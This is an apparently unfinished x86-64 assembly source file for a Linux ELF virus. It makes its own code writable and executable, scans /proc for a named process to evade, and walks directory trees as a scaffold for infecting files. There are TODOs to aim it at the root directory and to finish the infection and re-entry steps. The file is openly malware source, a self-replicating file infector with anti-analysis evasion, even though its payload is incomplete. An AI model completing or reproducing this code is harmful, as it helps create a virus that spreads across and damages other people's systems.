%include "main.inc"

; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific
; order (make sense with syscall)

global _start

; ------------------------ this section exists for packer to work ; to find after excecute segment offset ----------------
section .packer_sec
    db `haha`, 0

section .text

params:                                ; filled for infected binaries
    test_param dq 0x0

_start:

main:
    ; mprotect start to end labels to be RWX
    mov rax, SYS_MPROTECT
    lea rdi, [rel _start]
    lea rsi, [rel _end]
    sub rsi, rdi
    mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
    syscall

	; branch for infected file running or running patient 0
    cmp qword [test_param], 0
    je mother

infected:
    ; TODO: if run as infected, run the same routine as mother
    ; but modify evasion routine and jump to entry address afterward
    jmp exit_ok

mother:

	; evasion routine
    call evasion_routine
    
    test rax, rax
    jz exit_ok

    ; infection routine
    lea rdi, [rel root_dirs]
    call infection_routine
    jmp exit_err
    

; evasion routine, this is run to detect if certain
; processes are running by scanning the /proc/ directory
; returns 0 if evasion is requried
evasion_routine:
    push rbx
    push rcx
    push r8
    push r9

    mov rax, SYS_OPEN
    lea rdi, [rel proc_dir]
    mov rsi, O_RDONLY | O_DIRECTORY
    xor rdx, rdx
    syscall

    ; save this fd
    mov r9, rax

    test rax, rax
    js exit_err

.file_loop_start_evasion:
    sub rsp, DIRENT_BUF_SZ
    mov rdi, r9
    mov rsi, rsp
    mov rdx, DIRENT_BUF_SZ
    mov rax, SYS_GETDENTS64
    syscall

    test rax, rax
    js exit_err
    jz .file_loop_end_evasion
    
    mov rcx, 0

.dirent_read_loop_start_evasion: 
    cmp rcx, rax
    jge .dirent_read_loop_end_evasion

    mov rbx, rsp ; og stack w/ dirent is now at rbx
	push rax

    ; allocate /proc/[dirent.d_name]/status in stack
    ; open and read. If error, continue
    sub rsp, SIX_SEVEN

    lea rsi, [rel proc_dir]
    mov rdi, rsp
    mov rdx, 6
    call memcpy

    ; rax contains addr already
    lea rsi, [rbx + rcx + dirent.d_name]
    mov rdi, rax
    call strcpy

    lea rsi, [rel proc_status]
    mov rdi, rax
    mov rdx, 8
    call memcpy

    ; ; print stuff
    ; lea rdi, [rsp]
    ; call write_string_nl

    ; open 
    mov rax, SYS_OPEN
    lea rdi, [rsp]
    mov rsi, O_RDONLY
    xor rdx, rdx
    push rcx
    syscall
    pop rcx

    ; jmp to dirent_read_loop_start_evasion_end if err
    test rax, rax
    js .dirent_read_loop_start_evasion_end 

    ; consume file name 
    ; read first SIX_SEVEN bytes
	sub rsp, SIX_SEVEN
    mov rdi, rax
    lea rsi, [rsp]
    mov rdx, SIX_SEVEN - 1
    mov rax, SYS_READ
    push rcx
    syscall
    pop rcx
    mov byte [rsp + rax], 0

    ; strstr
	lea rdi, [rsp]
    lea rsi, [rel evade_proc]
    push r8
    push r9
    call strstr
    pop r9
    pop r8
    add rsp, SIX_SEVEN
    test eax, eax
    jz .dirent_read_loop_start_evasion_end
    add rsp, SIX_SEVEN + DIRENT_BUF_SZ + 8 ; push rax from earlier
    ; add rsp, DIRENT_BUF_SZ
    ; add rsp, 8 ; why is this needed or else rsp will be 8 bytes off when return?
    mov rax, 0
    jmp .ret


.dirent_read_loop_start_evasion_end:
    add rsp, SIX_SEVEN
    pop rax

.dirent_read_loop_cont_evasion:
    movzx r8, word [rsp + rcx + dirent.d_reclen]
    add rcx, r8
    jmp .dirent_read_loop_start_evasion
    
.dirent_read_loop_end_evasion: 
    add rsp, DIRENT_BUF_SZ
    jmp .file_loop_start_evasion


.file_loop_end_evasion:
    add rsp, DIRENT_BUF_SZ

mov rax, 1
.ret:
    pop r9
    pop r8
    pop rcx
    pop rbx
    ret

    ; lea r8, [rel _end] ; end addr
    ; lea r9, [rel _start]; start addr
    ; sub r8, r9 ; r8 = end - start


    ; xor rdi, rdi                        ; exit code 0
    ; mov rax, SYS_EXIT                   ; exit
    ; syscall

; input, rdi - a list of root directories
infection_routine:
    push rbx
    push rcx
    push r9
    push r8

; iterate through root folders
.roots_iter:
    mov r8, rdi

    ; for each folder, iterate through all the entities
    mov rax, SYS_OPEN
    mov rsi, O_RDONLY | O_DIRECTORY
    xor rdx, rdx
    syscall

    ; save this fd
    mov r9, rax

    test rax, rax
    js exit_err

    call write_string_nl

.file_loop_start_infection:
    sub rsp, DIRENT_BUF_SZ
    mov rdi, r9
    mov rsi, rsp
    mov rdx, DIRENT_BUF_SZ
    mov rax, SYS_GETDENTS64
    syscall

    test rax, rax
    js exit_err
    jz .file_loop_end_infection

    mov rcx, 0

; TODO: copy dirent_read_loop_start_evasion here
.dirent_read_loop_start_infection:
    cmp rcx, rax
    jge .dirent_read_loop_end_infection

    mov rbx, rsp ; og stack w/ dirent is now at rbx
	push rax

	mov rdi, r8
    call strlen

    sub rsp, BLAZEIT
    mov rsi, r8
    mov rdi, rsp
    mov rdx, rax
    call memcpy

	mov rdi, rax
    lea rsi, [rel slash]
    mov rdx, 1
    call memcpy

    lea rsi, [rbx + rcx + dirent.d_name]
    mov rdi, rax
    call strcpy

    ; print stuff
    lea rdi, [rsp]
    call write_string_nl
    add rsp, BLAZEIT
    pop rax


.dirent_read_loop_end_infection: 
    add rsp, DIRENT_BUF_SZ
    jmp .file_loop_start_infection

.file_loop_end_infection:
    add rsp, DIRENT_BUF_SZ

    
    mov rdi, r8
    call strlen
    inc rax
    add rdi, rax
    call strlen
    test rax, rax
    jz .roots_iter_end
    jmp .roots_iter

.roots_iter_end:


    ; ; load first addr
    ; mov rbx, rdi
    ; mov rdi, rbx
    ; call write_string_nl

    ; ; load 2nd addr
    ; call strlen
    ; inc rax
    ; add rdi, rax
    ; call write_string_nl
    

    ; if entity is a file, infect file

    ; if entity is a folder, call infection_routine on that folder
.ret:
    pop r8
	pop r9
    pop rcx
    pop rbx
    ret


error_exit:
    mov rdi, 1                          ; exit code 1
    mov rax, SYS_EXIT                   ; exit
    syscall

; -----------------------------------utils--------------------------------
exit_err:
    mov rdi, 1                          ; exit code 1
    mov rax, SYS_EXIT                   ; exit
    syscall

exit_ok:
    mov rdi, 0                          ; exit code 0
    mov rax, SYS_EXIT                   ; exit
    syscall

strlen:
    xor rax, rax

.loop:
    cmp byte[rdi + rax], 0
    je .done

    inc rax
    jmp .loop

.done:
    ret

write_string_nl:
    push rdi
    push rax
    push rcx

    call strlen ; rax = string length

    ; write(fd=stdout, buf=string, count=len)
    mov rdx, rax
    mov rax, SYS_WRITE
    mov rsi, rdi
    mov rdi, 1
    syscall

    ; write newline
    mov rax, SYS_WRITE
    mov rdi, 1
    lea rsi, [rel newline]
    mov rdx, 1
    syscall

	pop rcx
    pop rax
    pop rdi
    ret

memcpy:
    push rcx
    mov rcx, rdx
    rep movsb
    mov rax, rdi
    pop rcx
    ret

strcpy:
    push    rcx
    mov     rax, rdi

.loop:
    mov     cl, [rsi]
    mov     [rdi], cl
    inc     rsi
    inc     rdi
    test    cl, cl
    jnz     .loop

    mov     rax, rdi
    dec     rax
    pop     rcx
    ret

strstr:
    cmp     byte [rsi], 0
    je      .found

.outer:
    mov     r8, rdi
    mov     r9, rsi

.inner:
    mov     al, [r9]
    cmp     al, [r8]
    jne     .next
    inc     r9
    inc     r8
    cmp     byte [r9], 0
    jne     .inner

.found:
    mov     eax, 1
    ret

.next:
    inc     rdi
    cmp     byte [rdi], 0
    jne     .outer

    xor     eax, eax
    ret


break:
    ret
; -----------------------------------data-in-code-------------------------------

dirent_buf times DIRENT_BUF_SZ db 0x0

newline db `\n`
slash db `/`
null db 0

; TODO: change this to root 
root_dirs db `/tmp/test`, 0, `/tmp/test2`,0,0
excl_dir db `.`, 0, `..`, 0, 0

proc_dir db `/proc/`,0
proc_status db `/status`, 0
evade_proc db `\tcat\n`, 0

_end:
